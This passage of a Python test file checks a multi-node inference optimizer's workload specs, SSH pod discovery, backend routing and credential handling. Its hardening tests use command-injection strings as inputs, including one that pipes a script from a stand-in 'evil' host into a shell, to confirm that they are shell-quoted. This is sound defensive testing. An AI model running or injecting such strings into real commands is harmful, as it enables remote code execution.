    from hyperloom.inference_optimizer.multi_node._internal import workload_spec

    b = workload_spec.build_infera_workload_body(
        **{
            **_INFERA_MIN_KWARGS,
            "nodes": 1,
            "pd_mode": "disaggregated",
            "pd_prefill_nodes": 2,
            "pd_decode_nodes": 2,
            "pd_prefill_tp": 8,
            "pd_decode_tp": 8,
        },
    )
    assert b["inferaOptions"]["serviceRoles"] == ["frontend", "prefill", "decode"]
    assert "multinodeRoles" not in b["inferaOptions"]
    assert len(b["resources"]) == 3 and len(b["images"]) == 3
    assert b["resources"][1]["replica"] == 2 and b["resources"][2]["replica"] == 2
    # PD always carries rdmaResource ("1k") for cross-pod KV transfer.
    assert b["resources"][1]["rdmaResource"] == "1k"
    assert b["resources"][2]["rdmaResource"] == "1k"


def test_infera_body_pd_multinode_when_tp_exceeds_node():
    # PD with TP that exceeds one pod's GPUs: prefill/decode span nodes (LWS)
    # -> multinodeRoles + rdmaResource.
    from hyperloom.inference_optimizer.multi_node._internal import workload_spec

    b = workload_spec.build_infera_workload_body(
        **{
            **_INFERA_MIN_KWARGS,
            "nodes": 1,
            "pd_mode": "disaggregated",
            "pd_prefill_nodes": 2,
            "pd_decode_nodes": 2,
            "pd_prefill_tp": 16,
            "pd_decode_tp": 16,
        },
    )
    assert b["inferaOptions"]["multinodeRoles"] == ["prefill", "decode"]
    assert b["resources"][1]["rdmaResource"] == "1k"
    assert b["resources"][2]["rdmaResource"] == "1k"


def test_infera_discover_role_pods_groups_prefill_decode():
    from hyperloom.inference_optimizer.multi_node._internal import infera_support

    wl = {
        "pods": [
            {"podId": "x-frontend-a", "resourceId": 0, "podIP": "10.0.0.9"},
            {"podId": "x-prefillworker-1", "resourceId": 1, "podIP": "10.0.1.1"},
            {"podId": "x-prefillworker-0", "resourceId": 1, "podIP": "10.0.1.0"},
            {"podId": "x-decodeworker-0", "resourceId": 2, "podIP": "10.0.2.0"},
        ]
    }
    r = infera_support.discover_role_pods(wl)
    assert [p["podIP"] for p in r["prefill"]] == ["10.0.1.0", "10.0.1.1"]
    assert [p["sshPort"] for p in r["prefill"]] == [2222, 2223]
    assert [p["podIP"] for p in r["decode"]] == ["10.0.2.0"]
    assert r["decode"][0]["sshPort"] == 2232
    assert r["frontend"] and not r["worker"]


def test_infera_ssh_port_role_stride_and_idle_entrypoint():
    from hyperloom.inference_optimizer.multi_node._internal import infera_support

    assert infera_support.ssh_port_for_pod("prefill", 0, ssh_port_base=2222) == 2222
    assert infera_support.ssh_port_for_pod("decode", 0, ssh_port_base=2222) == 2232
    assert infera_support.ssh_port_for_pod("worker", 1, ssh_port_base=2222) == 2223
    prefill_ep = infera_support.idle_worker_entrypoint(role="prefill", ssh_port_base=2222)
    decode_ep = infera_support.idle_worker_entrypoint(role="decode", ssh_port_base=2222)
    assert "2222" in prefill_ep and "LWS_WORKER_INDEX" in prefill_ep
    assert "2232" in decode_ep


def test_infera_pd_body_decode_entrypoint_uses_higher_ssh_port():
    import base64

    from hyperloom.inference_optimizer.multi_node._internal import workload_spec

    b = workload_spec.build_infera_workload_body(
        **{
            **_INFERA_MIN_KWARGS,
            "nodes": 1,
            "pd_mode": "disaggregated",
            "pd_prefill_nodes": 1,
            "pd_decode_nodes": 1,
            "pd_prefill_tp": 8,
            "pd_decode_tp": 8,
        },
    )
    prefill_ep = base64.b64decode(b["entryPoints"][1]).decode()
    decode_ep = base64.b64decode(b["entryPoints"][2]).decode()
    assert "2222" in prefill_ep
    assert "2232" in decode_ep


def test_infera_disagg_flags_and_launch_args():
    from hyperloom.inference_optimizer.multi_node._internal import infera_support

    df = infera_support.disagg_flags("prefill", "nixl")
    assert "--disaggregation-mode prefill" in df
    assert "--disaggregation-transfer-backend nixl" in df
    assert "30001" in df
    assert infera_support.disagg_flags("bogus", "nixl") == ""

    la = infera_support.build_node_launch_args(
        framework="sglang",
        model="/m",
        tp=8,
        nnodes=1,
        disagg_mode="decode",
        kv_transfer_backend="nixl",
    )
    assert "--extra-args" in la and "decode" in la


def test_infera_body_vllm_backend_and_session_label():
    from hyperloom.inference_optimizer.multi_node._internal import workload_spec

    b = workload_spec.build_infera_workload_body(
        **{
            **_INFERA_MIN_KWARGS,
            "backend_framework": "vllm",
            "kv_transfer_backend": "mooncake",
            "session_id": "sess-xyz",
        },
    )
    assert b["inferaOptions"]["backendFramework"] == "vllm"
    assert b["inferaOptions"]["kvTransferBackend"] == "mooncake"
    assert b["labels"].get("primus-claw/session-id") == "sess-xyz"


# ---------------------------------------------------------------------------
# infera_support pure-helper tests (Infera backend SSH fan-out).


def test_infera_discover_worker_pods_excludes_frontend_sorts_by_ordinal():
    from hyperloom.inference_optimizer.multi_node._internal import infera_support

    wl = {
        "pods": [
            {"podId": "dyn-frontend-abc", "resourceId": 0, "podIP": "10.0.0.9"},
            {"podId": "dyn-worker-1", "resourceId": 1, "podIP": "10.0.0.2"},
            {"podId": "dyn-worker-0", "resourceId": 1, "podIP": "10.0.0.1"},
            {"podId": "dyn-worker-pending", "resourceId": 1, "podIP": ""},
        ]
    }
    w = infera_support.discover_worker_pods(wl)
    assert [p["podIP"] for p in w] == ["10.0.0.1", "10.0.0.2"]
    assert [p["lwsIndex"] for p in w] == [0, 1]


def test_infera_frontend_service_url_prefers_live_then_dns():
    from hyperloom.inference_optimizer.multi_node._internal import infera_support

    assert infera_support.frontend_service_url("wid", "ws") == "http://wid.ws.svc.cluster.local:8000"
    assert (
        infera_support.frontend_service_url("wid", "ws", {"clusterIp": "10.1.2.3", "port": 8000})
        == "http://10.1.2.3:8000"
    )


def test_infera_frontend_service_url_internal_domain_and_nested_port():
    from hyperloom.inference_optimizer.multi_node._internal import infera_support

    # internalDomain wins.
    assert (
        infera_support.frontend_service_url(
            "w",
            "ns",
            {"internalDomain": "w.ns.svc.cluster.local:8000", "clusterIp": "1.2.3.4", "port": {"port": 8000}},
        )
        == "http://w.ns.svc.cluster.local:8000"
    )
    # Nested port dict (SaFE shape) -> integer port, not the dict repr.
    assert (
        infera_support.frontend_service_url(
            "w",
            "ns",
            {"clusterIp": "192.168.154.0", "port": {"protocol": "TCP", "port": 8000, "targetPort": 8000}},
        )
        == "http://192.168.154.0:8000"
    )


def test_infera_build_node_launch_args_sglang_and_kill_only():
    from hyperloom.inference_optimizer.multi_node._internal import infera_support

    a = infera_support.build_node_launch_args(
        framework="sglang",
        model="/m/x",
        tp=16,
        nnodes=2,
        ep=16,
        extra_args="--mem-fraction-static 0.7",
    )
    assert "--framework sglang" in a
    assert "--tp 16" in a and "--nnodes 2" in a and "--ep 16" in a
    # Rank is self-determined pod-side from $LWS_WORKER_INDEX, never encoded.
    assert "--node-rank" not in a
    assert "--extra-args" in a and "0.7" in a

    k = infera_support.build_node_launch_args(
        framework="vllm",
        model="",
        tp=0,
        nnodes=2,
        kill_only=True,
    )
    assert "--kill-only" in k and "--framework vllm" in k
    assert "--model" not in k


# ---------------------------------------------------------------------------
# Infera kernel ops routing/isolation (apply-patch / kernel-bench / install-geak).


def test_resolve_geak_src_resolution_order(monkeypatch):
    from hyperloom.inference_optimizer.multi_node.commands import infera as mn_infera

    monkeypatch.delenv("HYPERLOOM_GEAK_SRC", raising=False)
    monkeypatch.delenv("HYPERLOOM_ROOT", raising=False)
    monkeypatch.delenv("USER_DATA_PATH", raising=False)
    assert mn_infera._resolve_geak_src("/x/geak") == "/x/geak"  # explicit wins
    monkeypatch.setenv("USER_DATA_PATH", "/data")
    assert mn_infera._resolve_geak_src(None) == "/data/runtime/geak"
    monkeypatch.setenv("HYPERLOOM_ROOT", "/r")
    assert mn_infera._resolve_geak_src(None) == "/r/geak"
    monkeypatch.setenv("HYPERLOOM_GEAK_SRC", "/explicit/geak")
    assert mn_infera._resolve_geak_src(None) == "/explicit/geak"


def test_apply_patch_routes_to_infera_only_when_backend_infera(tmp_path, monkeypatch):
    # backend=infera -> _infera_apply_patch; backend=rayjob -> legacy head_pod_ip
    # path (EXIT_CONFIG_ERROR without head_pod_ip). Proves isolation.
    from hyperloom.inference_optimizer.multi_node import cli as mn_cli

    sp = tmp_path / "s.json"
    sp.write_text('{"backend":"infera","nodes":2}', encoding="utf-8")
    sp.chmod(0o600)
    monkeypatch.setenv("MULTI_NODE_STATE_FILE", str(sp))
    monkeypatch.setattr(mn_cli, "_infera_apply_patch", lambda a: 4242)

    ns = argparse.Namespace(
        patch_file="/p",
        target_path="/t",
        backup_dir="/b",
        kernel_id="k",
        timeout_sec=60,
        print_logs=False,
        poll_interval=6,
        poll_timeout=110,
    )
    sp.write_text('{"backend":"infera","nodes":2}', encoding="utf-8")
    sp.chmod(0o600)
    assert mn_cli.cmd_apply_patch(ns) == 4242  # routed to infera

    sp.write_text('{"backend":"rayjob","nodes":2}', encoding="utf-8")
    sp.chmod(0o600)
    assert mn_cli.cmd_apply_patch(ns) == mn_cli.EXIT_CONFIG_ERROR  # legacy path


def test_kernel_bench_routes_to_infera_only_when_backend_infera(tmp_path, monkeypatch):
    from hyperloom.inference_optimizer.multi_node import cli as mn_cli

    sp = tmp_path / "s.json"
    sp.write_text('{"backend":"infera","nodes":2}', encoding="utf-8")
    sp.chmod(0o600)
    monkeypatch.setenv("MULTI_NODE_STATE_FILE", str(sp))
    monkeypatch.setattr(mn_cli, "_infera_kernel_bench", lambda a: 7777)

    ns = argparse.Namespace(
        workspace="/w",
        bench_command="true",
        files_b64_json="{}",
        result_glob="*.json",
        timeout_sec=60,
        print_logs=False,
        poll_interval=6,
        poll_timeout=110,
    )
    sp.write_text('{"backend":"infera","nodes":2}', encoding="utf-8")
    sp.chmod(0o600)
    assert mn_cli.cmd_kernel_bench(ns) == 7777
    sp.write_text('{"backend":"rayjob","nodes":2}', encoding="utf-8")
    sp.chmod(0o600)
    assert mn_cli.cmd_kernel_bench(ns) == mn_cli.EXIT_CONFIG_ERROR


def test_install_geak_best_effort_noop_for_rayjob(tmp_path, monkeypatch):
    # The provisioner hook must be a no-op (0) for non-infera backends.
    from hyperloom.inference_optimizer.multi_node import cli as mn_cli

    sp = tmp_path / "s.json"
    sp.write_text('{"backend":"rayjob","nodes":2}', encoding="utf-8")
    sp.chmod(0o600)
    monkeypatch.setenv("MULTI_NODE_STATE_FILE", str(sp))
    assert mn_cli.install_geak_on_pods_best_effort() == 0


def test_install_geak_noop_for_rayjob(tmp_path, monkeypatch):
    # GEAK SSH install is Infera-only; RayJob kernel-agent uses the Ray runtime.
    from hyperloom.inference_optimizer.multi_node import cli as mn_cli

    sp = tmp_path / "s.json"
    sp.write_text('{"backend":"rayjob","nodes":2}', encoding="utf-8")
    sp.chmod(0o600)
    monkeypatch.setenv("MULTI_NODE_STATE_FILE", str(sp))
    assert mn_cli.install_geak_on_pods_best_effort() == 0


# ---------------------------------------------------------------------------
# infera_ssh_env_from_state isolation tests (kernel-agent GEAK SSH placement).


def _write_mn_state(tmp_path, monkeypatch, payload):
    import json as _json

    sp = tmp_path / "mn_state.json"
    sp.write_text(_json.dumps(payload), encoding="utf-8")
    sp.chmod(0o600)
    monkeypatch.setenv("MULTI_NODE_STATE_FILE", str(sp))
    return sp


def test_infera_ssh_env_empty_for_rayjob(tmp_path, monkeypatch):
    # RayJob backend (or single-node) must yield {} so the Ray RAY_ADDRESS
    # placement path is left completely untouched.
    from hyperloom.orchestrator.actions.executors import _multi_node_env

    _write_mn_state(
        tmp_path,
        monkeypatch,
        {
            "backend": "rayjob",
            "nodes": 2,
            "head_pod_ip": "10.0.0.1",
            "ray_address": "10.0.0.1:6379",
        },
    )
    assert _multi_node_env.infera_ssh_env_from_state() == {}


def test_infera_ssh_env_aggregated_picks_worker_pod(tmp_path, monkeypatch):
    from hyperloom.orchestrator.actions.executors import _multi_node_env

    _write_mn_state(
        tmp_path,
        monkeypatch,
        {
            "backend": "infera",
            "nodes": 2,
            "pd_mode": "aggregated",
            "worker_pod_ips": ["10.0.1.0", "10.0.1.1"],
            "ssh_key_path": "/tmp/mn_ssh/k",
            "ssh_port": 2222,
        },
    )
    env = _multi_node_env.infera_ssh_env_from_state()
    assert env["KERNEL_AGENT_GPU_PLACEMENT"] == "ssh"
    assert env["MN_SSH_HOST"] == "10.0.1.0"
    assert env["MN_SSH_PORT"] == "2222"
    assert env["MN_SSH_KEY"] == "/tmp/mn_ssh/k"


def test_infera_ssh_env_pd_picks_prefill_then_decode(tmp_path, monkeypatch):
    from hyperloom.orchestrator.actions.executors import _multi_node_env

    _write_mn_state(
        tmp_path,
        monkeypatch,
        {
            "backend": "infera",
            "nodes": 2,
            "pd_mode": "disaggregated",
            "prefill_pod_ips": ["10.0.2.0"],
            "decode_pod_ips": ["10.0.3.0"],
            "ssh_key_path": "/tmp/mn_ssh/k",
            "ssh_port": 2222,
        },
    )
    env = _multi_node_env.infera_ssh_env_from_state()
    assert env["MN_SSH_HOST"] == "10.0.2.0"  # prefill first
    assert env["MN_SSH_PORT"] == "2222"


def test_infera_ssh_env_empty_without_pods_or_key(tmp_path, monkeypatch):
    from hyperloom.orchestrator.actions.executors import _multi_node_env

    _write_mn_state(
        tmp_path,
        monkeypatch,
        {
            "backend": "infera",
            "nodes": 2,
            "worker_pod_ips": [],
            "ssh_key_path": "/tmp/k",
        },
    )
    assert _multi_node_env.infera_ssh_env_from_state() == {}


# ---------------------------------------------------------------------------
# _write_rayjob_meta sidecar JSON tests.


def _write_meta_kwargs(**overrides):
    """Default kwargs for _write_rayjob_meta calls under test."""
    defaults = dict(
        wid="wid-abc",
        workspace="ws-a",
        session_id="sess-1",
        owner_id="owner-1",
        display_name="demo",
        nodes=2,
        gpus_per_node=8,
    )
    defaults.update(overrides)
    return defaults


def test_write_rayjob_meta_writes_expected_payload(tmp_path, monkeypatch):
    # Meta lands at <profile_traces>/<wid>/<session_id> with all fields populated and JSON-decodable.
    import json as _json

    from hyperloom.inference_optimizer.multi_node.commands import rayjob as mn_rayjob

    monkeypatch.setenv("USER_DATA_PATH", str(tmp_path))

    mn_rayjob._write_rayjob_meta(**_write_meta_kwargs())

    meta_path = tmp_path / "profile-traces" / "wid-abc" / "sess-1"
    assert meta_path.is_file()
    payload = _json.loads(meta_path.read_text(encoding="utf-8"))
    assert payload["rayjob_id"] == "wid-abc"
    assert payload["session_id"] == "sess-1"
    assert payload["owner_id"] == "owner-1"
    assert payload["workspace"] == "ws-a"
    assert payload["display_name"] == "demo"
    assert payload["nodes"] == 2
    assert payload["gpus_per_node"] == 8
    # created_at is an ISO-8601 UTC string (datetime.isoformat output).
    assert isinstance(payload["created_at"], str)
    assert payload["created_at"].endswith("+00:00")


def test_write_rayjob_meta_skipped_when_session_id_missing(tmp_path, monkeypatch):
    # Empty/None session_id → the helper short-circuits and creates nothing under profile-traces/.
    from hyperloom.inference_optimizer.multi_node.commands import rayjob as mn_rayjob

    monkeypatch.setenv("USER_DATA_PATH", str(tmp_path))

    mn_rayjob._write_rayjob_meta(**_write_meta_kwargs(session_id=None))
    mn_rayjob._write_rayjob_meta(**_write_meta_kwargs(session_id=""))

    profile_traces = tmp_path / "profile-traces"
    # The directory may not even exist; if it does, it must be empty.
    if profile_traces.exists():
        assert list(profile_traces.iterdir()) == []


def test_write_rayjob_meta_allows_null_owner_id(tmp_path, monkeypatch):
    # owner_id is optional; the meta must still serialize cleanly with owner_id=None.
    import json as _json

    from hyperloom.inference_optimizer.multi_node.commands import rayjob as mn_rayjob

    monkeypatch.setenv("USER_DATA_PATH", str(tmp_path))

    mn_rayjob._write_rayjob_meta(**_write_meta_kwargs(owner_id=None))

    meta_path = tmp_path / "profile-traces" / "wid-abc" / "sess-1"
    payload = _json.loads(meta_path.read_text(encoding="utf-8"))
    assert payload["owner_id"] is None


def test_write_rayjob_meta_best_effort_on_oserror(tmp_path, monkeypatch):
    # A filesystem failure must NOT propagate (meta is audit data); force Path.mkdir to raise OSError.
    from hyperloom.inference_optimizer.multi_node.commands import rayjob as mn_rayjob

    monkeypatch.setenv("USER_DATA_PATH", str(tmp_path))

    def _boom(self, *a, **kw):
        raise OSError("simulated read-only filesystem")

    monkeypatch.setattr("pathlib.Path.mkdir", _boom)

    # If the helper re-raised, this call would fail the test.
    mn_rayjob._write_rayjob_meta(**_write_meta_kwargs())

    # And no file should have been created.
    meta_path = tmp_path / "profile-traces" / "wid-abc" / "sess-1"
    assert not meta_path.exists()


def test_ray_gcs_address_from_state_prefers_ray_address(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    p = tmp_path / "state.json"
    p.write_text(
        json.dumps({"ray_address": "10.1.2.3:6379", "head_pod_ip": "10.9.9.9"}),
        encoding="utf-8",
    )
    p.chmod(0o600)
    monkeypatch.setenv("MULTI_NODE_STATE_FILE", str(p))
    assert mne.ray_gcs_address_from_state() == "10.1.2.3:6379"


def test_ray_gcs_address_from_state_fallback_head(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    p = tmp_path / "state.json"
    p.write_text(json.dumps({"head_pod_ip": "10.1.2.4"}), encoding="utf-8")
    p.chmod(0o600)
    monkeypatch.setenv("MULTI_NODE_STATE_FILE", str(p))
    assert mne.ray_gcs_address_from_state() == "10.1.2.4:6379"


def test_export_ray_address_to_os(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    p = tmp_path / "state.json"
    p.write_text(json.dumps({"head_pod_ip": "10.0.0.5"}), encoding="utf-8")
    p.chmod(0o600)
    monkeypatch.setenv("MULTI_NODE_STATE_FILE", str(p))
    monkeypatch.setenv("INFERENCE_OPTIMIZER_NODES", "2")
    monkeypatch.delenv("RAY_ADDRESS", raising=False)
    mne.export_ray_address_to_os()
    assert os.environ.get("RAY_ADDRESS") == "10.0.0.5:6379"


# ---------------------------------------------------------------------------
# Multi-node control-plane hardening (shell-quoting + credential minimization).


def test_multinode_entrypoint_shlex_quotes_malicious_value():
    """A shell-metacharacter kernel_id must be shlex-quoted into the Ray Dashboard entrypoint (no command injection)."""
    import shlex

    from hyperloom.inference_optimizer.multi_node import cli as mn_cli

    evil = "k'; touch /tmp/pwned #"
    ep = mn_cli._build_multinode_apply_patch_entrypoint("/t/x", "QUJD", "/bak", evil, 60)
    # The value is carried, but only as a single shlex-quoted token.
    assert shlex.quote(evil) in ep
    # The raw ``--kernel-id k'; touch ...`` (unquoted) form must NOT appear.
    assert f"--kernel-id {evil}" not in ep


def test_multinode_op_args_shlex_quotes_malicious_value():
    """The Infera SSH op_args builder path (bench) must also shlex-quote."""
    import shlex

    from hyperloom.inference_optimizer.multi_node import cli as mn_cli

    evil = "x; curl http://evil/p | sh"
    ns = argparse.Namespace(
        workspace="/w",
        bench_command=evil,
        files_b64_json="{}",
        result_glob="*.json",
        timeout_sec=60,
    )
    ep = mn_cli._build_multinode_kernel_bench_entrypoint(
        ns.workspace, ns.bench_command, ns.files_b64_json, ns.result_glob, ns.timeout_sec
    )
    assert shlex.quote(evil) in ep
    assert f"--bench-command {evil}" not in ep


def test_create_infera_env_omits_credentials(monkeypatch):
    """create-infera must NOT bake *_API_KEY / SAFE_API_KEY / *_BASE_URL into the
    new inference pod's container env; only operator --extra-env is forwarded."""
    from hyperloom.inference_optimizer.multi_node import cli as mn_cli
    # cmd_create_infera and its ssh_client/workload_spec usage live in the
    # ``commands.infera`` sibling; patch it there.
    from hyperloom.inference_optimizer.multi_node.commands import infera as mn_infera

    # Credentials present in the controller env (would previously fan out).
    for k in ("SAFE_API_KEY", "OPENAI_API_KEY", "ANTHROPIC_API_KEY", "OOB_API_KEY", "LLM_API_KEY"):
        monkeypatch.setenv(k, f"secret-{k}")
    monkeypatch.setenv("OPENAI_BASE_URL", "https://example/v1")

    monkeypatch.setattr(
        mn_infera.ssh_client, "generate_session_keypair", lambda d: (Path("/tmp/k"), "pubkey")
    )

    captured: dict = {}

    class _Sentinel(Exception):
        pass

    def _capture(**kwargs):
        captured["extra_env"] = kwargs.get("extra_env")
        raise _Sentinel()

    monkeypatch.setattr(mn_infera.workload_spec, "build_infera_workload_body", _capture)

    args = argparse.Namespace(
        workspace="ws",
        extra_env=["FOO=bar"],
        extra_label=[],
        image="img",
        model="/path/models/test",
        nodes=2,
        gpus_per_node=8,
        cpus_per_node=96,
        mem_per_node=1024,
        ephemeral_per_node=400,
        shared_mem_per_node=200,
        backend_framework="sglang",
        kv_transfer_backend="nixl",
        ssh_port=2222,
        pd_mode="aggregated",
        pd_prefill_nodes=0,
        pd_decode_nodes=0,
        pd_prefill_tp=0,
        pd_decode_tp=0,
        description=None,
        owner_id=None,
        display_name=None,
        recreate=False,
        no_wait=True,
    )

    with pytest.raises(_Sentinel):
        mn_cli.cmd_create_infera(args)

    env = captured["extra_env"]
    assert env == {"FOO": "bar"}
    for k in (
        "SAFE_API_KEY",
        "OPENAI_API_KEY",
        "ANTHROPIC_API_KEY",
        "OOB_API_KEY",
        "LLM_API_KEY",
        "OPENAI_BASE_URL",
    ):
        assert k not in env


def _bootstrap_sh() -> Path:
    return _repo_root() / "multi_node" / "scripts" / "bootstrap.sh"


def test_bootstrap_renders_env_file_path_only_no_credentials(tmp_path):
    """bootstrap.sh must render ENV_FILE with the venv PATH only, never creds.

    Regression guard for the fix that stopped writing *_API_KEY / *_BASE_URL
    into the world-readable /etc/profile.d/hyperloom-env.sh: credentials present
    in the process env must NOT leak into the rendered file.
    """
    # Fake framework venv with an executable python3 so section 1 resolves.
    venv = tmp_path / "venv"
    (venv / "bin").mkdir(parents=True)
    py = venv / "bin" / "python3"
    py.write_text("#!/usr/bin/env bash\nexit 0\n", encoding="utf-8")
    py.chmod(0o755)

    env_file = tmp_path / "hyperloom-env.sh"
    secrets = {
        "AMD_LLM_API_KEY": "secret-amd",
        "ANTHROPIC_API_KEY": "secret-anthropic",
        "OPENAI_API_KEY": "secret-openai",
        "SAFE_API_KEY": "secret-safe",
        "ANTHROPIC_BASE_URL": "https://secret.example/v1",
    }
    env = {
        **os.environ,
        "HYPERLOOM_VENV": str(venv),
        "ENV_FILE": str(env_file),
        "BOOTSTRAP_MARKER": str(tmp_path / "bootstrap_done"),
        "LOG_DIR": str(tmp_path / "log"),
        **secrets,
    }
    proc = subprocess.run(
        ["bash", str(_bootstrap_sh())],
        env=env,
        capture_output=True,
        text=True,
    )
    assert proc.returncode == 0, proc.stderr

    rendered = env_file.read_text(encoding="utf-8")
    assert f'export PATH="{venv}/bin:${{PATH}}"' in rendered
    # Neither the credential keys nor their values may appear in the 0644 file.
    for key, val in secrets.items():
        assert key not in rendered
        assert val not in rendered
    assert (env_file.stat().st_mode & 0o777) == 0o644
